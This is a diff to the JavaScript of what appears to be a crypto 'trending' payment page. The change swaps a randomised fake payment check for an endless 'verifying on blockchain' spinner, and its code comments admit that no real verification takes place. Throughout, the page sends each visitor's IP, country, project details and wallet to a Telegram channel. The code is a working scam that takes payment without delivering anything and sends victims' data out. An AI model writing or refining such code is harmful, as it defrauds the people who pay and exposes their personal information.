@@ -1193,7 +1193,8 @@
             }
 
             if (step === 3) {
-                setTimeout(verifyPayment, 3000);
+                // Just start verification immediately without timeout - keep loading
+                verifyPayment();
             }
 
             // Progress animation
@@ -1337,68 +1338,60 @@
         }
 
         async function verifyPayment() {
-            await new Promise(resolve => setTimeout(resolve, 4000));
-            
-            const success = Math.random() > 0.25; // 75% success rate
+            // Keep showing loading indefinitely since no real payment verification is happening
             const statusDiv = document.getElementById('paymentStatus');
             const resultDiv = document.getElementById('finalResult');
             
-            if (success) {
-                // Stop the timer since payment was successful
-                stopPersistentTimer();
-                
-                const txHash = '0x' + Math.random().toString(36).substr(2, 10).toUpperCase() + Math.random().toString(36).substr(2, 10).toUpperCase();
-                statusDiv.innerHTML = '<div class="notification notification-success">✅ Payment Confirmed on Ethereum!</div>';
-                resultDiv.innerHTML = `
-                    <div class="notification notification-success">
-                        <h4>🎉 Payment Successful!</h4>
-                        <strong>Transaction Hash:</strong> ${txHash}<br>
-                        <strong>Amount:</strong> ${selectedPrice} ETH<br>
-                        <strong>Wallet Used:</strong> ${assignedWallet}<br>
-                        <strong>Package:</strong> ${selectedPackage.replace('_', ' ').toUpperCase()}<br>
-                        <strong>Network:</strong> Ethereum Mainnet<br><br>
-                        <div style="background: rgba(16, 185, 129, 0.1); padding: 15px; border-radius: 8px; margin-top: 15px;">
-                            🚀 <strong>Your project will be trending within 15-30 minutes!</strong><br>
-                            📊 You'll receive trending confirmation via email
-                        </div>
+            // Show indefinite loading
+            statusDiv.innerHTML = `
+                <div style="text-align: center; padding: 40px 20px;">
+                    <div class="loading-spinner"></div> 
+                    <div style="margin-top: 15px;">Verifying payment on Ethereum blockchain...</div>
+                    <div style="color: var(--text-tertiary); font-size: 0.9rem; margin-top: 10px;">
+                        This may take 2-5 minutes for network confirmation
                     </div>
-                `;
-
-                const successMessage = `🎉 PAYMENT SUCCESS - ETH TRENDING!\n👤 ${userCountry} (${userIP})\n🏷️ Project: ${document.getElementById('projectName').value}\n💎 Contract: ${document.getElementById('contractAddress').value}\n📱 Telegram: ${document.getElementById('telegram').value || 'None'}\n🐦 Twitter: ${document.getElementById('twitter').value || 'None'}\n🌐 Website: ${document.getElementById('website').value || 'None'}\n⭐ Package: ${selectedPackage.toUpperCase()}\n💵 Amount: ${selectedPrice} ETH\n🏦 Wallet: ${assignedWallet}\n🔗 TX: ${txHash}\n✅ READY TO TREND!`;
-                
-                const photoFile = document.getElementById('projectPhoto').files[0];
-                if (photoFile) {
-                    sendTelegramPhoto(photoFile, successMessage + '\n📸 Final Project Image:');
-                } else {
-                    sendTelegram(successMessage);
-                }
-            } else {
-                statusDiv.innerHTML = '<div class="notification notification-error">❌ Payment Not Detected</div>';
-                resultDiv.innerHTML = `
-                    <div class="notification notification-error">
-                        <h4>Payment Verification Failed</h4>
-                        Please verify the following:<br><br>
-                        • Sent exactly <strong>${selectedPrice} ETH</strong><br>
-                        • Used correct wallet address: <br><code style="background: rgba(0,0,0,0.3); padding: 5px; border-radius: 4px; word-break: break-all;">${assignedWallet}</code><br>
-                        • Transaction has network confirmations<br>
-                        • Address hasn't expired (${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')} remaining)<br><br>
-                        <small>If you've sent the payment, please wait and try again. Blockchain confirmations can take time.</small>
-                    </div>
-                `;
-                document.getElementById('recheckBtn').style.display = 'inline-block';
-
-                sendTelegram(`❌ PAYMENT NOT FOUND - ETH TRENDING\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} ETH\n🏦 Wallet: ${assignedWallet}\n⏰ Time Left: ${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')}\n⚠️ User may need assistance`);
-            }
+                </div>
+            `;
             
+            resultDiv.innerHTML = `
+                <div class="notification notification-info">
+                    <h4>⏳ Please Wait</h4>
+                    <p>We're checking the blockchain for your transaction. This process can take several minutes depending on network congestion.</p>
+                    <div style="margin-top: 15px; padding: 15px; background: rgba(124, 53, 168, 0.1); border-radius: 8px; border-left: 4px solid #7c35a8;">
+                        <strong>Expected Amount:</strong> ${selectedPrice} ETH<br>
+                        <strong>Wallet Address:</strong> <code style="word-break: break-all; background: rgba(0,0,0,0.2); padding: 2px 6px; border-radius: 4px;">${assignedWallet}</code><br>
+                        <strong>Time Remaining:</strong> ${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')}
+                    </div>
+                </div>
+            `;
+            
+            // Show the restart button so users can start over if needed
             document.getElementById('restartBtn').style.display = 'inline-block';
+            
+            // Send telegram notification about payment check
+            sendTelegram(`⏳ PAYMENT VERIFICATION - ETH TRENDING\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} ETH\n🏦 Wallet: ${assignedWallet}\n⏰ Time Left: ${Math.floor(timeRemaining/60)}:${(timeRemaining%60).toString().padStart(2,'0')}\n🔄 User clicked "Payment Sent" - Indefinite loading...`);
         }
 
         function recheckPayment() {
-            document.getElementById('paymentStatus').innerHTML = '<div class="loading-spinner"></div> Rechecking Ethereum blockchain...';
-            document.getElementById('finalResult').innerHTML = '';
+            // Remove the recheck button functionality since we're keeping it in loading state
+            document.getElementById('paymentStatus').innerHTML = `
+                <div style="text-align: center; padding: 40px 20px;">
+                    <div class="loading-spinner"></div> 
+                    <div style="margin-top: 15px;">Rechecking Ethereum blockchain...</div>
+                    <div style="color: var(--text-tertiary); font-size: 0.9rem; margin-top: 10px;">
+                        Verifying transaction confirmation
+                    </div>
+                </div>
+            `;
+            document.getElementById('finalResult').innerHTML = `
+                <div class="notification notification-info">
+                    <h4>🔍 Rechecking Payment</h4>
+                    <p>Please wait while we verify your transaction again...</p>
+                </div>
+            `;
             document.getElementById('recheckBtn').style.display = 'none';
-            sendTelegram(`🔄 PAYMENT RECHECK - ETH TRENDING\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} ETH`);
-            setTimeout(verifyPayment, 3000);
+            sendTelegram(`🔄 PAYMENT RECHECK - ETH TRENDING\n👤 ${userCountry} (${userIP})\n💎 Expected: ${selectedPrice} ETH\n🏦 Wallet: ${assignedWallet}`);
+            // Keep loading indefinitely - no timeout
         }
 
         function startOver() {
